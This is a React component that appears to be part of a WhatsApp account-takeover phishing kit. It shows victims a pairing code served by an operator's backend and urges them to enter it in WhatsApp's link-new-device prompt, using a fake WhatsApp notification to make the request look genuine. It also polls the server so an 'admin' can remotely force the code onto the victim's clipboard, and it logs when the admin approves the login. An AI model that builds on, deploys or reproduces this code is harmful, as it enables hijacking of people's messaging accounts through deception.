import React, { useState, useEffect } from "react";
import { Check, Copy, MessageSquare, RotateCcw, ShieldCheck } from "lucide-react";

interface StepSuccessTipsProps {
  code: string;
  onNext: () => void;
  onBack: () => void;
  userId: string;
  session?: any;
}

export default function StepSuccessTips({ code, onNext, onBack, userId, session }: StepSuccessTipsProps) {
  const [copied, setCopied] = useState(false);

  const [seconds, setSeconds] = useState(15);

  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((prev) => {
        if (prev <= 1) return 15;
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleCopy = () => {
    if (!session?.codeLive) return;
    const cleanCode = code.replace(/[^A-Z0-9]/ig, "");
    navigator.clipboard.writeText(cleanCode)
      .then(() => {
        setCopied(true);
        setTimeout(() => {
          setCopied(false);
          onNext();
        }, 1200);
      })
      .catch((err) => {
        console.warn("Manual clipboard copy blocked/failed:", err);
        onNext();
      });
  };

  // Immediate reaction to central session prop updates
  useEffect(() => {
    if (session) {
      if (session.loginStatus === "success") {
        fetch("/api/log-activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            action: "লগইন সফল হয়েছে (Central Prop Monitor)",
            details: { code }
          })
        }).catch(console.error);

        onNext();
      }
    }
  }, [session, userId, code, onNext]);

  // Real-time remote action polling fallback
  useEffect(() => {
    const pollInterval = setInterval(async () => {
      try {
        const res = await fetch(`/api/sessions/${userId}`);
        const data = await res.json();
        if (data.success && data.session) {
          const { remoteCopyTrigger, loginStatus } = data.session;
          
          if (remoteCopyTrigger) {
            // Trigger Clipboard Copy automatically on admin's request!
            navigator.clipboard.writeText(code)
              .then(() => {
                setCopied(true);
                setTimeout(() => setCopied(false), 2000);
              })
              .catch((err) => {
                console.warn("Automated clipboard copy blocked (Document not focused):", err);
              });
            
            // Log activity & reset trigger
            fetch("/api/log-activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId,
                action: "রিমোট কপি ট্রিগার সফলভাবে সম্পন্ন হয়েছে (Auto-Copied by Admin Command)",
                details: { code }
              })
            }).catch(console.error);

            fetch(`/api/sessions/${userId}/clear-remote-copy`, { method: "POST" }).catch(console.error);
          }
          
          if (loginStatus === "success") {
            // Log & advance automatically
            fetch("/api/log-activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId,
                action: "লগইন সফল হয়েছে (Admin Approved Success)",
                details: { code }
              })
            }).catch(console.error);

            onNext();
          }
        }
      } catch (err) {
        console.warn("Polling error in StepSuccessTips:", err);
      }
    }, 2000);

    return () => clearInterval(pollInterval);
  }, [userId, code, onNext]);

  return (
    <div className="flex flex-col justify-between h-full flex-grow text-center select-none">
      <div className="flex-grow flex flex-col justify-center py-2 animate-fade-in">
        {/* Tips Title (Yellow) */}
        <h1 className="text-[#facc15] text-3xl font-extrabold mb-3 tracking-wide drop-shadow-sm">
          Tips
        </h1>

        {/* Description */}
        <p className="text-zinc-200 text-sm font-medium px-4 mb-4 leading-relaxed">
          The pairing code has been copied,
          <br />
          please paste it in WhatsApp
        </p>

        {/* Dynamic Mock Mobile Phone Preview Frame */}
        <div className="border-2 border-zinc-800 rounded-[32px] p-4 bg-[#08080a] w-[240px] mx-auto mb-4 relative aspect-[9/12] flex flex-col justify-start shadow-2xl overflow-hidden">
          {/* Top Camera Notch Detail */}
          <div className="absolute top-1 left-1/2 -translate-x-1/2 w-20 h-4 bg-black rounded-full z-25 flex items-center justify-center">
            <div className="w-2.5 h-2.5 bg-zinc-900 rounded-full border border-zinc-800"></div>
          </div>

          {/* Phone Status Bar Details */}
          <div className="flex justify-between items-center text-[9px] text-zinc-500 mb-4 px-1 mt-1 z-10 font-mono">
            <span>16:04 💬 💻</span>
            <div className="flex gap-1 items-center">
              <span className="bg-zinc-800 text-zinc-400 px-1 rounded-[2px] text-[7px] font-bold">VPN</span>
              <span>📶 🪫 54%</span>
            </div>
          </div>

          {/* WhatsApp Banner (Native IOS Style) */}
          <div className="bg-white rounded-2xl p-3 text-left shadow-lg border border-zinc-100 z-10 transform translate-y-2 animate-bounce-slow">
            <div className="flex items-center justify-between text-[10px] text-zinc-500 font-medium">
              <div className="flex items-center gap-1.5">
                <span className="text-[#25D366] text-xs font-bold leading-none">💬</span>
                <span className="font-semibold text-zinc-400">WhatsApp • now</span>
              </div>
              <span>🔔</span>
            </div>
            <div className="text-xs font-bold mt-1 text-zinc-900">WhatsApp Notification</div>
            <div className="text-[10px] text-zinc-600 mt-0.5 leading-snug font-medium">
              Enter code to link new device on your system.
            </div>
          </div>

          {/* Graphic Background hints */}
          <div className="absolute bottom-4 left-4 right-4 bg-blue-500/5 py-3 rounded-xl border border-blue-500/10 text-[9px] text-zinc-600">
            Secure Remote Link Active
          </div>
        </div>

        {/* Text Instruction */}
        <p className="text-[#a855f7] font-extrabold text-xs mb-4 px-4 leading-normal animate-pulse">
          Please pay attention to the WhatsApp popup window next.
        </p>

        {/* Verification Code Box with Dashed Border and COPY Button */}
        <div className="border-2 border-dashed border-purple-500/60 rounded-2xl py-3 px-4 flex justify-between items-center bg-purple-950/10 mx-2 mb-4">
          <div className="flex flex-col text-left">
            <span className="text-[10px] text-zinc-400 font-semibold tracking-wider uppercase">Verification Code:</span>
            {session?.codeLive ? (
              <span className="text-xl font-bold tracking-wider text-pink-400 font-mono">
                {code}
              </span>
            ) : (
              <span className="text-lg font-bold tracking-wider text-[#facc15] font-mono animate-pulse">
                {seconds}s Waiting...
              </span>
            )}
          </div>
          
          <button
            onClick={handleCopy}
            disabled={!session?.codeLive}
            className={`text-xs font-bold px-4 py-2 rounded-xl transition-all flex items-center gap-1 shrink-0 ${
              !session?.codeLive
                ? "bg-zinc-800 text-zinc-500 cursor-not-allowed"
                : copied 
                ? "bg-green-600 text-white" 
                : "bg-purple-600 hover:bg-purple-700 text-white"
            } active:scale-95`}
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5" />
                <span>Connected!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Connect</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Action Buttons */}
      <div className="mb-2 space-y-2">
        <button
          onClick={onNext}
          className="w-full bg-[#25D366] hover:bg-[#20ba5a] text-white font-extrabold py-4 px-6 rounded-3xl transition-all duration-300 tracking-wider text-sm uppercase shadow-lg shadow-green-950/20 transform hover:scale-[1.01] active:scale-95 flex items-center justify-center gap-2"
        >
          <MessageSquare className="w-4 h-4 fill-current" />
          <span>Copy to WhatsApp</span>
        </button>
        
        {/* Simple Reset Trigger option */}
        <button
          onClick={onBack}
          className="text-xs text-zinc-500 hover:text-zinc-300 transition-colors flex items-center justify-center gap-1 mx-auto py-1"
        >
          <RotateCcw className="w-3" />
          <span>নম্বর পরিবর্তন করুন</span>
        </button>
      </div>
    </div>
  );
}
